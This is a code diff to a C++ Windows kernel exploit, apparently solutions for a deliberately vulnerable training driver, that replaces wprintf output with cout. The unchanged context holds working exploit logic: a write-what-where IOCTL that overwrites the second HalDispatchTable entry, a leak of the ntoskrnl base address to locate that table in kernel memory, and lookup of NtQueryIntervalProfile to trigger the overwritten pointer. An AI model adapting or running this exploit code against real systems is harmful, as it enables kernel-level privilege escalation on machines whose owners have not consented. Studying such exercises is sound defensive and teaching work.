@@ -1,9 +1,12 @@
 #include <Windows.h>
-#include "stdio.h"
+#include <iostream>
+
 #include "string.h"
 #include "Solutions.h"
 #include "ioctal_codes.h"
 #include "utils.h"
+
+using namespace std;
 
 typedef enum _SYSTEM_INFORMATION_CLASS {
 	SystemModuleInformation = 11,
@@ -47,7 +50,7 @@ NTSTATUS Solutions::TriggerWriteWhatWhere() {
 	DWORD dwBufSize = 8;
 	ULONG where = (ULONG)getHalDispatchTableAddr() + 4; // second entry
 	if (!(where - 4)) {
-		wprintf(L"[-] Failed getting halDispatchTable address");
+		cout << "[-] Failed getting halDispatchTable address" << endl;
 		return 1;
 	}
 
@@ -57,23 +60,23 @@ NTSTATUS Solutions::TriggerWriteWhatWhere() {
 	DWORD dwBytesReturned = 0;
 
 	if (!lpInBuffer) {
-		wprintf(L"[-] Could not allocate buffer :(\n");
+		cout << "[-] Could not allocate buffer :(" << endl;
 		return 1;
 	}
 
-	wprintf(L"[+] Allocated buffer with %d bytes\n", dwBufSize);
+	cout << "[+] Allocated buffer with " << dwBufSize << " bytes" << endl;
 
 	*(PULONG)lpInBuffer = what;
 	*(PULONG)(lpInBuffer + sizeof(ULONG)) = where;
 
 	if (!DeviceIoControl(_hDeviceHandle, IOCTL_WRITE_WHAT_WHERE, lpInBuffer, dwBufSize,
 						NULL, NULL, &dwBytesReturned, NULL)) {
-		wprintf(L"[-] Could not interact with the driver :(\n");
+		cout << "[-] Could not interact with the driver :(" << endl;
 		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
 		return 1;
 	}
 
-	wprintf(L"[+] Succsfully talked with the driver\n");
+	cout << "[+] Succsfully talked with the driver" << endl;
 
 	HMODULE ntdll = GetModuleHandle(L"ntdll");
 	auto query = (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
@@ -95,13 +98,13 @@ static PVOID getHalDispatchTableAddr() {
 	query(SystemModuleInformation, NULL, NULL, &modulesLength);
 	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, modulesLength);
 	if (!pModuleInfo) {
-		wprintf(L"[-] could not allocate buffer for modules\n");
+		cout << "[-] could not allocate buffer for modules" << endl;
 		return NULL;
 	}
 
 	query(SystemModuleInformation, (PVOID)pModuleInfo, modulesLength, NULL);
 	if (!modulesLength) {
-		wprintf(L"[-] Failed retriving modules information\n");
+		cout << "[-] Failed retriving modules information" << endl;
 		return NULL;
 	}
 
@@ -116,27 +119,27 @@ static PVOID getHalDispatchTableAddr() {
 	HeapFree(GetProcessHeap(), NULL, pModuleInfo);
 
 	if (ntoskrnlBase == 0) {
-		wprintf(L"[-] Could not found ntoskrnl.exe module");
+		cout << "[-] Could not found ntoskrnl.exe module" << endl;
 		return NULL;
 	}
 
-	wprintf(L"[+] ntoskrnl image base 0x%x\n", ntoskrnlBase);
+	cout << "[+] ntoskrnl image base " << hex << ntoskrnlBase << endl;
 	
 	HMODULE hNtoskrnl = LoadLibrary(L"ntoskrnl.exe");
 	if (!hNtoskrnl) {
-		wprintf(L"[-] could not load library ntoskrnl.exe - %d\n", GetLastError());
+		cout << "[-] could not load library ntoskrnl.exe - " << GetLastError() << endl;
 		return NULL;
 	}
 
 	PVOID pHalUserLand = GetProcAddress(hNtoskrnl, "HalDispatchTable");
 	if (!pHalUserLand) {
-		wprintf(L"[-] could not get halDispatchTable addres\n");
+		cout << "[-] could not get halDispatchTable addres" << endl;
 		return NULL;
 	}
-	wprintf(L"[+] HalDispatchTable usermode address: 0x%x\n", pHalUserLand);
+	cout << "[+] HalDispatchTable usermode address: " << hex << pHalUserLand << endl;
 	
 	PVOID HalDispatchTable = (PVOID)((ULONG)pHalUserLand - (ULONG)hNtoskrnl + (ULONG)ntoskrnlBase);
-	wprintf(L"[+] HalDispatchTable kernelmode address: 0x%x\n", (ULONG)HalDispatchTable);
+	cout << "[+] HalDispatchTable kernelmode address: " << hex << (ULONG)HalDispatchTable << endl;
 	
 	return HalDispatchTable;
 }
